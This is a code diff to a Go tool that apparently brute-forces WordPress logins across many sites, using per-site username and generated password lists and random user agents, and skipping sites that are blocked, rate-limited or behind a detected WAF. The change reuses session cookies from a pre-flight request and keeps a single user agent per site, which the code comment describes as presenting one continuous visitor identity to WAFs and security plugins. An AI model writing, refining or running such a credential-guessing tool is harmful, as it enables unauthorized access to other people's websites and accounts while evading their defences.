@@ -202,6 +202,8 @@ type Attempt struct {
 type SiteJob struct {
 	Site      string
 	Aliases   []string // input URLs replaced by a scheme fallback, checkpointed with the job
+	Cookies   string   // session cookies from the pre-flight GET, reused for every attempt
+	UserAgent string
 	Users     []string
 	Passwords []string
 
@@ -938,7 +940,7 @@ func activeSiteCapacity() int {
 
 // prepareJob runs the pre-flight checks. Returns nil when the site is skipped.
 func prepareJob(site string) *SiteJob {
-	working, reason := quickCheckRetry(site)
+	working, reason, cookies := quickCheckRetry(site)
 	if reason != "" {
 		stats.skipped.Add(1)
 		stats.completed.Add(1)
@@ -957,6 +959,8 @@ func prepareJob(site string) *SiteJob {
 	}
 	job := &SiteJob{
 		Site:      working,
+		Cookies:   cookies,
+		UserAgent: randomUA(),
 		Users:     users,
 		Passwords: generateSitePasswords(basePasses, working, users),
 		quit:      make(chan struct{}),
@@ -1069,37 +1073,9 @@ func processAttempt(a *Attempt) {
 // ============================================================================
 
 func tryLogin(j *SiteJob, user, pass string) (loginOutcome, string) {
-	// STEP 1: GET /wp-login.php to establish session cookies
-	preReq := fasthttp.AcquireRequest()
-	preResp := fasthttp.AcquireResponse()
-	preReq.SetRequestURI(j.Site + "/wp-login.php")
-	preReq.Header.SetMethod("GET")
-	preReq.Header.Set("User-Agent", randomUA())
-
-	preErr := httpClient.DoTimeout(preReq, preResp, time.Duration(*timeoutSec)*time.Second)
-	fasthttp.ReleaseRequest(preReq)
-
-	if preErr != nil {
-		fasthttp.ReleaseResponse(preResp)
-		diagLog("NET_ERR", j.Site, fmt.Sprintf("%s:%s - pre-session failed", user, pass))
-		return outNetErr, "network_error"
-	}
-
-	// Extract cookies from pre-response
-	var sessionCookies []string
-	preResp.Header.VisitAll(func(key, value []byte) {
-		if strings.EqualFold(string(key), "Set-Cookie") {
-			sv := string(value)
-			if idx := strings.IndexByte(sv, ';'); idx > 0 {
-				sessionCookies = append(sessionCookies, strings.TrimSpace(sv[:idx]))
-			} else if sv = strings.TrimSpace(sv); sv != "" {
-				sessionCookies = append(sessionCookies, sv)
-			}
-		}
-	})
-	fasthttp.ReleaseResponse(preResp)
-
-	// STEP 2: POST login form with session cookies
+	// The session (and its cookies) was established once during the pre-flight
+	// check, so an attempt is a single POST instead of GET+POST. Reusing it also
+	// keeps one continuous visitor identity per site for WAFs and plugins.
 	req := fasthttp.AcquireRequest()
 	resp := fasthttp.AcquireResponse()
 	defer fasthttp.ReleaseRequest(req)
@@ -1115,11 +1091,17 @@ func tryLogin(j *SiteJob, user, pass string) (loginOutcome, string) {
 	req.SetRequestURI(j.Site + "/wp-login.php")
 	req.Header.SetMethod("POST")
 	req.Header.SetContentType("application/x-www-form-urlencoded")
-	req.Header.Set("User-Agent", randomUA())
+	ua := j.UserAgent
+	if ua == "" {
+		ua = randomUA()
+	}
+	req.Header.Set("User-Agent", ua)
 
-	// Use session cookies from GET request
-	allCookies := append(sessionCookies, "wordpress_test_cookie=WP+Cookie+check")
-	req.Header.Set("Cookie", strings.Join(allCookies, "; "))
+	cookieHeader := "wordpress_test_cookie=WP+Cookie+check"
+	if j.Cookies != "" {
+		cookieHeader = j.Cookies + "; " + cookieHeader
+	}
+	req.Header.Set("Cookie", cookieHeader)
 	req.SetBodyString(form.Encode())
 
 	start := time.Now()
@@ -2117,7 +2099,9 @@ func expandPasswords(passes []string, username, siteName, domainName string) []s
 
 // quickCheck classifies a site before we spend attempts on it.
 // "" means clean; anything else is the skip reason.
-func quickCheck(site string) string {
+// quickCheck classifies a site before we spend attempts on it and returns the
+// session cookies of that very page for reuse by every login attempt.
+func quickCheck(site string) (string, string) {
 	req := fasthttp.AcquireRequest()
 	resp := fasthttp.AcquireResponse()
 	defer fasthttp.ReleaseRequest(req)
@@ -2133,33 +2117,43 @@ func quickCheck(site string) string {
 	stats.requests.Add(1)
 
 	if err != nil {
-		return "network_error"
+		return "network_error", ""
 	}
 	if elapsed.Milliseconds() > int64(*slowThresh) {
-		return "slow"
+		return "slow", ""
 	}
 
 	switch resp.StatusCode() {
 	case fasthttp.StatusNotFound:
-		return "not_wordpress"
+		return "not_wordpress", ""
 	case fasthttp.StatusForbidden, fasthttp.StatusNotAcceptable:
-		return "blocked"
+		return "blocked", ""
 	case fasthttp.StatusTooManyRequests:
-		return "rate_limited"
+		return "rate_limited", ""
 	case fasthttp.StatusServiceUnavailable:
-		return "unavailable"
+		return "unavailable", ""
 	}
 
 	if *skipWaf {
 		if waf := detectWAF(resp.Body(), &resp.Header); waf != "" {
-			return "waf_" + waf
+			return "waf_" + waf, ""
 		}
 	}
 
 	if !isWordPressLogin(resp.Body()) {
-		return "not_wordpress"
+		return "not_wordpress", ""
 	}
-	return ""
+
+	var cookies []string
+	resp.Header.VisitAll(func(key, value []byte) {
+		if strings.EqualFold(string(key), "Set-Cookie") {
+			sv := string(value)
+			if idx := strings.IndexByte(sv, ';'); idx > 0 {
+				cookies = append(cookies, strings.TrimSpace(sv[:idx]))
+			}
+		}
+	})
+	return "", strings.Join(cookies, "; ")
 }
 
 // quickCheckRetry runs the pre-flight check with one immediate retry for
@@ -2167,30 +2161,30 @@ func quickCheck(site string) string {
 // sites with broken or missing TLS are not silently checkpointed as dead.
 // It returns the URL to use and "" on success, or the original URL plus the
 // skip reason.
-func quickCheckRetry(site string) (string, string) {
-	reason := quickCheck(site)
+func quickCheckRetry(site string) (string, string, string) {
+	reason, cookies := quickCheck(site)
 	if reason == "" {
-		return site, ""
+		return site, "", cookies
 	}
 
 	if reason == "network_error" || reason == "slow" {
 		time.Sleep(250 * time.Millisecond)
-		if reason = quickCheck(site); reason == "" {
-			return site, ""
+		if reason, cookies = quickCheck(site); reason == "" {
+			return site, "", cookies
 		}
 	}
 	if reason != "network_error" && reason != "slow" {
-		return site, reason
+		return site, reason, ""
 	}
 
 	alt := swapScheme(site)
 	if alt == "" {
-		return site, reason
+		return site, reason, ""
 	}
-	if r := quickCheck(alt); r == "" {
-		return alt, ""
+	if reason, cookies = quickCheck(alt); reason == "" {
+		return alt, "", cookies
 	}
-	return site, reason
+	return site, reason, ""
 }
 
 // swapScheme flips https:// to http:// and vice versa.
